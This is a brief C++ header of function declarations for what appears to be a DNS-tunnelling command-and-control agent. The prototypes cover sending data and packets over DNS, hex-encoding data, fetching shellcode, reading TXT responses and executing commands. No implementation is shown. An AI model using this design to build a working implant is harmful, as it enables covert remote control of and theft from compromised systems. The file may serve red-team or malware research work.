#include "Declarations.h"



BOOL SendData(LPSTR agentName, LPSTR data);
VOID DataToHEX(const std::string str, std::string& hexstr, bool capital);
std::string SendDNSPacket(LPSTR agentName,LPSTR packetType,LPCSTR responseData);
std::string ExecuteCommand(LPCSTR command);
std::string GetShellcode(LPSTR agentName);
std::string GetTxtFromDNS(std::string response);



